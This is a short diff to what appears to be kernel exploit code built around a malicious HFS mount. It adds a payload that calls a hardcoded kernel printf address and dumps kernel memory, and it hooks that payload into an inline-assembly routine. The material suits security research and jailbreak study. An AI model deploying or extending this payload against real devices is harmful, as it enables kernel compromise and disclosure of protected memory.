@@ -67,8 +67,28 @@ void mount_evil_hfs() {
 	}
 }
 
+
+int(*myprintf)(const char *fmt, ...);
+
+void dump(void *addr, unsigned int size) {
+	unsigned int i;
+	unsigned int count = size >> 2;
+	unsigned int *daddr = (unsigned int *) addr;
+	
+	for (i = 0; i < count; i+=4) {
+		myprintf("%08x %08x %08x %08x\n", daddr[i], daddr[i+1], daddr[i+2], daddr[i+3]);
+	}
+}
+
+void real_payload() {
+	myprintf = 0x801A6BE9;
+	dump(0x80001000, 0x100);
+}
+
 void payload() {
 	// push	{r7, lr}
+
+	real_payload();
 
 	asm (
 		// the compiler adds a push before the code, reverting the effect:
